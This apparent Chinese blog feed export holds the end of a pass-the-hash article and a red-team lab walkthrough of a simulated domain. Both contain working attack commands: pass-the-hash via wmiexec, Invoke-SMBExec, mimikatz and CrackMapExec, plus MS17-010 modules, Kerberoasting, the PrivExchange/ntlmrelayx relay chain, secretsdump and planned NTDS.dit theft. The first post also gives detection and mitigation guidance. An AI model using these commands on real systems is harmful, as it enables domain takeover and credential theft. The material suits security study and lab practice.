class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py -hashes e6db7544d2c6d325ca3b108f3faa626d:<span class="number">5</span>a625b04e786347908fc5f5d8a26dad5(LMHASH:NTHASH) rcoil/john@<span class="number">192.10</span><span class="number">.20</span><span class="number">.22</span> <span class="string">"whoami"</span></span><br></pre></td></tr></table></figure></li><li><p><strong>Invoke-WMIExec</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WMIExec -Target <span class="number">192.10</span>.<span class="number">20.22</span> -Domain rcoil.org -Username john -Hash <span class="number">5</span>a625b04e786347908fc5f5d8a26dad5 -Command <span class="string">"calc.exe"</span> -verbose</span><br></pre></td></tr></table></figure></li><li><p><strong>Invoke-SMBExec</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-SMBExec -Target <span class="number">192.10</span>.<span class="number">20.22</span> -Domain rcoil.org -Username john -Hash <span class="number">5</span>a625b04e786347908fc5f5d8a26dad5 -Command <span class="string">"calc.exe"</span> -verbose</span><br></pre></td></tr></table></figure></li><li><p><strong>mimikatz</strong>（Overpass-the-hash）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege：：debug</span><br><span class="line">sekurlsa::pth /user:john /domain:rcoil.org /ntlm:<span class="number">5</span>a625b04e786347908fc5f5d8a26dad5</span><br></pre></td></tr></table></figure></li><li><p><strong>CrackMapExec</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme smb <span class="number">192.10</span><span class="number">.20</span><span class="number">.22</span> -u john -H <span class="number">5</span>a625b04e786347908fc5f5d8a26dad5 -x whoami</span><br></pre></td></tr></table></figure></li></ul><h1 id="0x03-如何检测"><a href="#0x03-如何检测" class="headerlink" title="0x03 如何检测"></a>0x03 如何检测</h1><p>由于Hash传递的结果为有效身份验证，因此建议检测查看涉及到的身份验证日志以确定正常用户行为与异常用户行为。这可能需要大量的数据分析，且可能导致许多误报的调查结果。</p><h2 id="1）-工作组日志事件"><a href="#1）-工作组日志事件" class="headerlink" title="1） 工作组日志事件"></a>1） 工作组日志事件</h2><ul><li><p>产生NTLM身份验证</p><p><img src="/image/【知识回顾】Pass The Hash/blog_2019-04-03_15-47-55.png" alt="blog_2019-04-04_15-47-55.png"></p></li><li><p><strong>日志ID 4648 查看登录信息</strong></p><p><img src="/image/【知识回顾】Pass The Hash/blog_2019-04-03_16-08-45.png" alt="blog_2019-04-03_16-08-45.png"></p><p>显示账户已经成功登陆</p></li><li><p><strong>日志ID 4624 所有用户登录事件</strong></p><p><img src="/image/【知识回顾】Pass The Hash/blog_2019-04-03_16-12-14.png" alt="blog_2019-04-03_16-12-14.png"></p></li></ul><p>  在4624事件中，登陆类型为2，表示是一个交互式登陆。这符合使用runas登陆的方式。</p><ul><li><p><strong>日志ID 4672 分配给新登录的特权</strong></p><p><img src="/image/【知识回顾】Pass The Hash/blog_2019-04-03_16-19-27.png" alt="blog_2019-04-03_16-19-27.png"></p></li><li><p><strong>SQLServer 机器</strong></p><p>在<code>192.168.1.104</code>机器上查看，在<code>4624事件</code>上能明确看到登陆类型为3，即网络登陆。且登陆<code>身份验证数据包</code>为NTLM。我们还将看到4672事件，因为我们利用的用户帐户是特权帐户</p></li></ul><h2 id="2）-域控日志事件"><a href="#2）-域控日志事件" class="headerlink" title="2） 域控日志事件"></a>2） 域控日志事件</h2><p>以下是我们在不使用pass-the-hash执行NTLM身份验证时看到的日志摘要。这为我们提供了正常行为的基线。</p><table><thead><tr><th><strong>Source Host</strong></th><th><strong>Target Host</strong></th><th><strong>Domain Controller</strong></th></tr></thead><tbody><tr><td>4648 - 使用显式凭据尝试登录</td><td>4624 - 帐户已成功登录。登录类型3，NTLM</td><td>4768 - 请求了Kerberos身份验证票证（TGT）</td></tr><tr><td>4624 - 帐户已成功登录。登录类型2</td><td>4672 - 分配给新登录的特权</td><td>4769 - 请求了Kerberos服务票证</td></tr><tr><td>4672 - 分配给新登录的特权</td><td></td><td>4776 - 计算机尝试验证帐户的凭据</td></tr></tbody></table><p>接下来看看<code>【知识回顾】Pass The Hash</code>所产生的日志事件</p><h2 id="3）【知识回顾】Pass-The-Hash事件"><a href="#3）【知识回顾】Pass-The-Hash事件" class="headerlink" title="3）【知识回顾】Pass The Hash事件"></a>3）【知识回顾】Pass The Hash事件</h2><p>以下是我们在使用<code>Pass-The-Hash</code>执行NTLM身份验证时看到的日志摘要。</p><table><thead><tr><th><strong>Source Host</strong></th><th><strong>Target Host</strong></th><th><strong>Domain Controller</strong></th></tr></thead><tbody><tr><td>4648 - 使用显式凭据尝试登录</td><td>4624 - 帐户已成功登录。登录类型3，NTLM</td><td>4776 - 计算机尝试验证帐户的凭据</td></tr><tr><td>4624 - 帐户已成功登录 <strong>（登录类型= 9 </strong>,<strong>登录过程= Seclogo</strong></td><td>4672 - 分配给新登录的特权</td><td></td></tr><tr><td>4672 - 分配给新登录的特权 <strong>（登录用户，而不是模拟用户）</strong></td><td></td></tr></tbody></table><p>自定义事件过滤器，可用于显示特定信息。</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;QueryList&gt;</span><br><span class="line">  &lt;Query Id=<span class="string">"0"</span> Path=<span class="string">"Security"</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">Select</span> Path=<span class="string">"Security"</span>&gt;</span><br><span class="line">     *[System[(EventID=<span class="string">'4624'</span>)]</span><br><span class="line">      <span class="literal">and</span></span><br><span class="line">     EventData[Data[<span class="symbol">@Name</span>=<span class="string">'LogonType'</span>]=<span class="string">'9'</span>]</span><br><span class="line">      <span class="literal">and</span></span><br><span class="line">     EventData[Data[<span class="symbol">@Name</span>=<span class="string">'LogonProcessName'</span>]=<span class="string">'seclogo'</span>]</span><br><span class="line">     <span class="literal">and</span></span><br><span class="line">     EventData[Data[<span class="symbol">@Name</span>=<span class="string">'AuthenticationPackageName'</span>]=<span class="string">'Negotiate'</span>]</span><br><span class="line">     ]</span><br><span class="line">     &lt;/<span class="keyword">Select</span>&gt;</span><br><span class="line">  &lt;/Query&gt;</span><br><span class="line">  &lt;Query Id=<span class="string">"0"</span> Path=<span class="string">"Microsoft-Windows-Sysmon/Operational"</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">Select</span> Path=<span class="string">"Microsoft-Windows-Sysmon/Operational"</span>&gt;</span><br><span class="line">    *[System[(EventID=<span class="number">10</span>)]]</span><br><span class="line">    <span class="literal">and</span></span><br><span class="line">    *[EventData[Data[<span class="symbol">@Name</span>=<span class="string">'GrantedAccess'</span>] <span class="literal">and</span> (Data=<span class="string">'0x1010'</span> <span class="literal">or</span> Data=<span class="string">'0x1038'</span>)]]</span><br><span class="line">&lt;/<span class="keyword">Select</span>&gt;</span><br><span class="line">  &lt;/Query&gt;</span><br><span class="line">&lt;/QueryList&gt;</span><br></pre></td></tr></table></figure><p>以上日志事件可自行验证。</p><p>VB代码为：&lt;    <a href="https://docs.microsoft.com/en-us/previous-versions/bb671200%28v%3dvs.90%29&gt;" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/bb671200%28v%3dvs.90%29&gt;</a></p><h2 id="4-powershell"><a href="#4-powershell" class="headerlink" title="4) powershell"></a>4) powershell</h2><p><a href="https://github.com/cyberark/ketshash" target="_blank" rel="noopener">https://github.com/cyberark/ketshash</a></p><h2 id="5）-要想放心，还是得买买买"><a href="#5）-要想放心，还是得买买买" class="headerlink" title="5） 要想放心，还是得买买买"></a>5） 要想放心，还是得买买买</h2><p><a href="https://www.stealthbits.com/stealthdefend-product" target="_blank" rel="noopener">StealthDEFEND</a></p><p><a href="https://www.manageengine.com/products/active-directory-audit/index.html?ADAPID=101030&amp;kw=adaudit%20plus&amp;adId=7397729447&amp;gclid=CjwKCAjw-ZvlBRBbEiwANw9UWinKcfl0WJWvQu1HSdeSdhyNqxxJIGMNZ7DOoC0M_CGNX5zazdLDHxoCt8wQAvD_BwE" target="_blank" rel="noopener">Real-Time Auditing for Active Directory</a></p><p>略….</p><h2 id="6）蜜罐部署"><a href="#6）蜜罐部署" class="headerlink" title="6）蜜罐部署"></a>6）蜜罐部署</h2><p><a href="https://blog.stealthbits.com/detecting-pass-the-hash-honeypots/" target="_blank" rel="noopener">https://blog.stealthbits.com/detecting-pass-the-hash-honeypots/</a><br><a href="https://blog.stealthbits.com/implementing-detections-for-the-honeyhash/" target="_blank" rel="noopener">https://blog.stealthbits.com/implementing-detections-for-the-honeyhash/</a><br><a href="https://blog.stealthbits.com/deploying-pass-the-hash-honeypots/" target="_blank" rel="noopener">https://blog.stealthbits.com/deploying-pass-the-hash-honeypots/</a><br><a href="https://go.stealthbits.com/l/71852/2018-09-11/7vsk5x" target="_blank" rel="noopener">https://go.stealthbits.com/l/71852/2018-09-11/7vsk5x</a></p><p>略….</p><h1 id="0x04-缓解措施"><a href="#0x04-缓解措施" class="headerlink" title="0x04 缓解措施"></a>0x04 缓解措施</h1><ul><li>域管账户只能访问域控制器，且强调最少用户访问的概念。</li><li>域控制器与其余敏感系统只能从可信的脱网环境进行访问。</li><li>使用双因素身份验证。</li><li>监控身份验证与异常登陆活动相关日志。</li><li>启用LSA保护。</li><li><p>手动添加注册表，取消明文存储（<a href="https://blogs.technet.microsoft.com/srd/2014/06/05/an-overview-of-kb2871997/" target="_blank" rel="noopener">KB2871997</a>补丁）：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM<span class="symbol">\S</span>YSTEM<span class="symbol">\C</span>urrentControlSet<span class="symbol">\C</span>ontrol<span class="symbol">\S</span>ecurityProviders<span class="symbol">\W</span>Digest /v UseLogonCredential /t REG_DWORD /d 0</span><br></pre></td></tr></table></figure></li><li><p>略….</p></li></ul><h1 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h1><p><a href="https://en.wikipedia.org/wiki/Pass_the_hash" target="_blank" rel="noopener">【知识回顾】Pass The Hash</a><br><a href="https://www.anquanke.com/post/id/85995" target="_blank" rel="noopener">从hash传递攻击谈相关Windows安全机制</a><br><a href="https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material#ESAE_BM" target="_blank" rel="noopener">Active Directory administrative tier model</a><br><a href="https://www.anquanke.com/post/id/86054" target="_blank" rel="noopener">如何检测Windows中的横向渗透攻击</a><br><a href="https://blog.stealthbits.com/how-to-detect-pass-the-hash-attacks/" target="_blank" rel="noopener">HOW TO DETECT PASS-THE-HASH ATTACKS</a><br><a href="https://www.sans.org/reading-room/whitepapers/testing/pass-the-hash-attacks-tools-mitigation-33283" target="_blank" rel="noopener">Pass-the-hash attacks: Tools and Mitigation</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个&lt;strong&gt;[ 知识回顾 ]&lt;/strong&gt;系列文章，整合记录的是在掌握知识点中，所忽略的点、涉及的原理等；&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="系统安全" scheme="https://rcoil.me/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
      <category term="知识回顾" scheme="https://rcoil.me/tags/%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE/"/>
    
  </entry>
  
  <entry>
    <title>【测试评估】内网练习（四）</title>
    <link href="https://rcoil.me/2019/03/%E3%80%90%E6%B5%8B%E8%AF%95%E8%AF%84%E4%BC%B0%E3%80%91%E5%86%85%E7%BD%91%E7%BB%83%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <id>https://rcoil.me/2019/03/【测试评估】内网练习（四）/</id>
    <published>2019-03-11T03:13:38.000Z</published>
    <updated>2019-11-01T01:47:14.192Z</updated>
    
    <content type="html"><![CDATA[<p>环境为模拟环境，文章使用的均为公开测试工具且未涉及到各个方法的原理。</p><p>分享便是我最好的老师。   ——Micropoor</p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在渗透测试中，经常会遇到一些奇奇怪怪的环境。本文所采用的环境是一个红蓝对抗靶场，以贴切实际环境为出发点。</p><ul><li>目的：摸清整个内网拓扑图、获取域控内的flag文件及指定域用户手中的flag。</li><li>提示：flag{ooxx-ooxx}</li></ul><ul><li><p>初始网络拓扑</p><p><img src="/image/【测试评估】内网练习（四）/初始网络拓扑.png" alt="初始网络拓扑"></p></li></ul><h1 id="0x01-靶机信息收集"><a href="#0x01-靶机信息收集" class="headerlink" title="0x01 靶机信息收集"></a>0x01 靶机信息收集</h1><p>因为是模拟环境，所以初始权限为<code>win7域用户权限</code>（上了RAT–&gt;http协议）。</p><ul><li><code>DKRST011</code>的基本信息</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">机器名: DKRST011</span><br><span class="line">权限: 域用户权限(rcoil\tk001)</span><br><span class="line">系统: Windows <span class="number">7</span> Professional <span class="number">6.1</span><span class="number">.7601</span> Service Pack <span class="number">1</span> Build <span class="number">7601</span> x64</span><br><span class="line">Domain: rcoil.local</span><br><span class="line">IP地址: <span class="number">172.16</span><span class="number">.238</span><span class="number">.29</span></span><br><span class="line">杀软: McAfee(非最新版)</span><br><span class="line">补丁情况：[*<span class="number">240</span>]</span><br><span class="line">.NET版本：V1<span class="number">.0</span>、V1<span class="number">.1</span>、V2<span class="number">.0</span>、V3<span class="number">.0</span>、V3<span class="number">.5</span>、V4<span class="number">.0</span></span><br><span class="line">已有操作: 密码拖取（需要未提权）、全盘文件列表获取、浏览器浏览记录及密码、TCP连接及进程等相关基础操作</span><br><span class="line">额为信息: <span class="number">192.168</span><span class="number">.5</span><span class="number">.6</span>:<span class="number">8080</span>为内网代理服务 --&gt; Linux</span><br></pre></td></tr></table></figure><p>在收集信息的时候发现<code>TCP连接</code>都是内网连接，而RAT的进程连接也是内网，感觉网络有问题。</p><p>探测出网情况：此机器为半脱网情况，<code>dns、icmp、udp均不可出来</code>，http与https协议可出网。所有出网程序连接均为<code>192.10.22.6:8080</code>，由此初步判断为代理出网情况，且是http无限制出网。</p><p>通过对带有password等关键字眼的文件进行搜索拖取，当作储备。</p><ul><li><strong>内网存活探测</strong></li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- ICMP</span><br><span class="line">- SMB</span><br><span class="line">172.16.88.0/16</span><br><span class="line">192.168.5.0/16</span><br><span class="line"><span class="built_in">..</span><span class="built_in">..</span></span><br></pre></td></tr></table></figure><h1 id="0x02-对域内信息进行获取"><a href="#0x02-对域内信息进行获取" class="headerlink" title="0x02 对域内信息进行获取"></a>0x02 对域内信息进行获取</h1><p>从全盘文件列表中可看到<code>setspn</code>是存在的，但是在我进行对域信息进行收集的时候发现已经没了（两个操作之间隔着一段时间）。为了方便操作（<code>socks代理</code>），所以使用<code>Cobalt Strike</code>上线操作。</p><h2 id="1）问题（均为RAT上运行）"><a href="#1）问题（均为RAT上运行）" class="headerlink" title="1）问题（均为RAT上运行）"></a>1）问题（均为RAT上运行）</h2><ul><li><code>Cobalt Strike</code>免杀问题；</li><li><code>powerview</code>运行无反应（powershell、C#）；</li><li><code>Bloodhound/Sharphou</code>运行无反应；</li><li><code>setspn.exe</code> 被删除。</li></ul><h2 id="2）方案"><a href="#2）方案" class="headerlink" title="2）方案"></a>2）方案</h2><ul><li>免杀<code>shellcode</code>，使用加载器运行，<a href="https://github.com/Micropoor/Micro8/blob/master/payload%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E7%AC%AC%E4%BA%8C%E5%AD%A3%EF%BC%88%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AB%E8%AF%BE%EF%BC%89.pdf" target="_blank" rel="noopener">例子</a> ；</li><li><code>Cobalt Strike</code>的<code>execute-assembly</code>运行本地相应C#程序；</li><li>使用<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py" target="_blank" rel="noopener">GetUserSPNs</a> 替换<code>setspn</code>使用；<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GetUserSPNs.py -request -dc-ip <span class="number">192.10</span><span class="number">.22</span><span class="number">.22</span> pentestlab.com/rcoil</span><br></pre></td></tr></table></figure></li></ul><h2 id="3）域信息的收集结果大致如下"><a href="#3）域信息的收集结果大致如下" class="headerlink" title="3）域信息的收集结果大致如下"></a>3）域信息的收集结果大致如下</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">域控：</span><br><span class="line">TTT<span class="number">-2</span>_172<span class="number">.16</span><span class="number">.88</span><span class="number">.21</span>_windows <span class="number">2016</span> x64 (主域控)</span><br><span class="line">TTT-V_172<span class="number">.16</span><span class="number">.88</span><span class="number">.20</span>_windows <span class="number">2016</span> x64 (辅助域控)</span><br><span class="line">域管理员：<span class="number">10</span>+</span><br><span class="line">域用户：<span class="number">200</span>+</span><br><span class="line">域内机器：<span class="number">150</span>+</span><br><span class="line">其他：略....</span><br></pre></td></tr></table></figure><h1 id="0x03-域控（域管理员）权限获取方法"><a href="#0x03-域控（域管理员）权限获取方法" class="headerlink" title="0x03 域控（域管理员）权限获取方法"></a>0x03 域控（域管理员）权限获取方法</h1><p>按照当前权限，梳理出一些知识点，大概可支持当前应用（知识串联）。</p><h2 id="1）-常规方法及结果"><a href="#1）-常规方法及结果" class="headerlink" title="1） 常规方法及结果"></a>1） 常规方法及结果</h2><ul><li><p><strong>组策略漏洞（GPP）</strong>–&gt; （MS14-025）</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">方法：</span><br><span class="line">enum4linux -a -u tk001 -p P@ssw0rd <span class="number">172.16</span><span class="number">.88</span><span class="number">.21</span> (数据收集)</span><br><span class="line">smbclient <span class="comment">//172.16.88.21/SYSVOL -U tk001</span></span><br><span class="line">或者使用msf</span><br><span class="line">auxiliary/scanner/smb/smb_enum_gpp</span><br><span class="line">[*] 结果：</span><br><span class="line">失败（其实单单看是<span class="number">2016</span> server系统就知道不会成功）</span><br></pre></td></tr></table></figure></li><li><p><strong>MS17-010</strong></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*]msf</span><br><span class="line">auxiliary<span class="meta-keyword">/admin/</span>smb/ms17_010_command         </span><br><span class="line">auxiliary<span class="meta-keyword">/scanner/</span>smb/smb_ms17_010</span><br><span class="line">exploit<span class="meta-keyword">/windows/</span>smb/ms17_010_eternalblue</span><br><span class="line">exploit<span class="meta-keyword">/windows/</span>smb/ms17_010_eternalblue_win8</span><br><span class="line">exploit<span class="meta-keyword">/windows/</span>smb/ms17_010_psexec</span><br><span class="line">[*] 结果：</span><br><span class="line">TTT-V_172<span class="number">.16</span><span class="number">.88</span><span class="number">.20</span>成功执行命令</span><br></pre></td></tr></table></figure></li><li><p><strong>Kerberoasting</strong></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*]GetUserSPNs.<span class="keyword">py</span></span><br><span class="line"><span class="keyword">python</span> GetUserSPNs.<span class="keyword">py</span> -request -dc-ip <span class="number">192.10</span>.<span class="number">22.22</span> pentestlab.<span class="keyword">com</span>/rcoil </span><br><span class="line">关闭Kerberos预身份认证</span><br><span class="line">[*]Rubeus --&gt; http<span class="variable">s:</span>//github.<span class="keyword">com</span>/GhostPack/Rubeus</span><br><span class="line">Rubeus.<span class="keyword">exe</span> asreproast # 枚举所有域用户（或者指定）Roasting AS-REPs</span><br><span class="line">[*] 结果:</span><br><span class="line">失败</span><br></pre></td></tr></table></figure></li></ul><h2 id="2）-主流方法及结果"><a href="#2）-主流方法及结果" class="headerlink" title="2） 主流方法及结果"></a>2） 主流方法及结果</h2><ul><li><p><strong>基于资源约束委派</strong>(RBCD) –&gt; （未尝试）</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">*</span>] 条件：<span class="number">2012</span>+域控制器</span><br><span class="line">[<span class="meta">*</span>] powermad</span><br><span class="line">[<span class="meta">*</span>] powerview</span><br><span class="line">[<span class="meta">*</span>] Rubeus</span><br><span class="line">[<span class="meta">*</span>] SharpAllowedToAct</span><br><span class="line">https:<span class="comment">//github.com/pkb1s/SharpAllowedToAct</span></span><br></pre></td></tr></table></figure></li><li><p><strong>NTLM中继攻击</strong>（未尝试）</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*] Responder</span><br><span class="line">windows版本：https:<span class="regexp">//gi</span>thub.com<span class="regexp">/Kevin-Robertson/</span>Inveigh（修改函数名绕杀软等方法）</span><br><span class="line">linux版本：https:<span class="regexp">//gi</span>thub.com<span class="regexp">/SpiderLabs/</span>Responder</span><br><span class="line">[*] mitm6+ntlmrelayx</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/fox-it/mi</span>tm6</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/SecureAuthCorp/im</span>packet<span class="regexp">/blob/m</span>aster<span class="regexp">/examples/</span>ntlmrelayx.py</span><br><span class="line">[*] CrackMapExec</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/byt3bl33d3r/</span>CrackMapExec</span><br></pre></td></tr></table></figure></li><li><p><strong>Exchange</strong> （未启用Exchange）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Privexchange</span></span><br><span class="line"><span class="selector-tag">privexchange</span><span class="selector-class">.py</span> <span class="selector-tag">-ah</span> 172<span class="selector-class">.16</span><span class="selector-class">.238</span><span class="selector-class">.29</span> <span class="selector-tag">TTT-2</span><span class="selector-class">.rcoil</span><span class="selector-class">.local</span> <span class="selector-tag">-u</span> <span class="selector-tag">tk001</span> <span class="selector-tag">-d</span> <span class="selector-tag">rcoil</span><span class="selector-class">.local</span> <span class="selector-tag">-p</span> <span class="selector-tag">P</span>@<span class="keyword">ssw0rd</span>  # Privexchange.py对echange进行API调用</span><br><span class="line">ntlmrelayx.py -t ldap://<span class="number">172.16</span>.<span class="number">88.21</span> --escalate-user tk001 # ntlmrelayx将Exchange服务器的凭据中继到主DC，然后升级tk001的权限</span><br><span class="line">secretsdump.py rcoil/tk001@TTT-<span class="number">2</span>.rcoil.local -just-dc</span><br><span class="line"></span><br><span class="line">[*] Exchange2domain --&gt; 一体化的privexchange工具</span><br><span class="line">https://github.com/Ridter/Exchange2domain</span><br></pre></td></tr></table></figure></li></ul><h2 id="3）-辅助工具"><a href="#3）-辅助工具" class="headerlink" title="3） 辅助工具"></a>3） 辅助工具</h2><ul><li><a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener">BloodHound</a> –&gt; 映射出活动目录关系</li><li><a href="https://github.com/hausec/ADAPE-Script" target="_blank" rel="noopener">ADAPE-Script </a> –&gt; AD评估和权限提升脚本</li><li><a href="https://raw.githubusercontent.com/samratashok/nishang/master/Escalation/Invoke-PsUACme.ps1" target="_blank" rel="noopener">Invoke-PsUACme</a> –&gt; 绕过UAC</li><li><a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener">CrackMapExec</a> –&gt;  查找特权帐户等等等利用</li><li><a href="https://github.com/byt3bl33d3r/SILENTTRINITY" target="_blank" rel="noopener">SILENTTRINITY</a> –&gt;  后期利用</li><li>….</li></ul><p>除了以上这些点，还有很多方法，最无脑的就是查看当前用户具有读权限的域内所有共享，信息收集，翻一轮、</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*] powerview</span><br><span class="line">Find-DomainShare -CheckShareAccess | <span class="type">fl</span> | <span class="type">Out</span>-<span class="keyword">File</span> domain-shares.txt</span><br><span class="line">[*] 略....</span><br></pre></td></tr></table></figure><h1 id="0x04-域控权限"><a href="#0x04-域控权限" class="headerlink" title="0x04 域控权限"></a>0x04 域控权限</h1><p><code>TTT-V_172.16.88.20</code>使用<code>MS17-010</code>成功执行命令。</p><p>域控信息：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">机器名: TTT-V</span><br><span class="line">权限: 域控权限</span><br><span class="line">系统: Windows Server <span class="number">2016</span> Standard <span class="number">10.0</span><span class="meta">.14393</span> N/A Build <span class="number">14393</span> x64</span><br><span class="line">OS Configuration: Additional/Backup Domain Controller</span><br><span class="line"><span class="symbol">Domain:</span> rcoil.local</span><br><span class="line"><span class="built_in">IP</span>地址: <span class="number">172.16</span><span class="meta">.88</span><span class="meta">.20</span></span><br><span class="line">杀软: McAfee(非最新版)</span><br><span class="line">补丁情况：[*<span class="number">2</span>]</span><br><span class="line"><span class="meta">.NET</span>版本：V1<span class="meta">.0</span>、V1<span class="meta">.1</span>、V2<span class="meta">.0</span>、V3<span class="meta">.0</span>、V3<span class="meta">.5</span>、V4<span class="meta">.0</span></span><br><span class="line">端口情况：无Web --&gt; TTT-<span class="number">2_172.16</span><span class="meta">.88</span><span class="meta">.21</span>存在<span class="number">80</span>端口IIS服务</span><br><span class="line">域信任关系：rcoil.local（root）</span><br><span class="line">   demo.rcoil.local</span><br></pre></td></tr></table></figure><p>往下的思路是这样的：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[*]</span> 本机<span class="selector-tag">flag</span>获取</span><br><span class="line"><span class="selector-attr">[*]</span> 在<span class="selector-tag">TTT-V</span>机器上拖取<span class="selector-tag">NTDS</span><span class="selector-class">.dit</span>文件，本地恢复获取域内所有用户<span class="selector-tag">hash</span>。当然，能获取到明文是最好的。</span><br><span class="line"><span class="selector-attr">[*]</span> 使用<span class="selector-tag">CrackMapExec</span>、<span class="selector-tag">wmiexec</span>等工具执行相关操作（重点：以域管权限启动<span class="selector-tag">CS</span>，后使用<span class="selector-tag">PTH</span>攻击 <span class="selector-tag">--</span>&gt; 简直完美）。</span><br></pre></td></tr></table></figure><h2 id="1）实施"><a href="#1）实施" class="headerlink" title="1）实施"></a>1）实施</h2><ul><li><p><strong>flag获取</strong></p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] dir</span><br><span class="line">dir /s flag</span><br><span class="line">[*] powerview(可选)</span><br><span class="line">Invoke-Filefinder -Threads <span class="number">100</span> -<span class="keyword">Verbose</span> -Terms flag -IncludeC -OutFile <span class="keyword">C</span>:\Windows\Temp\flags.txt</span><br><span class="line"></span><br><span 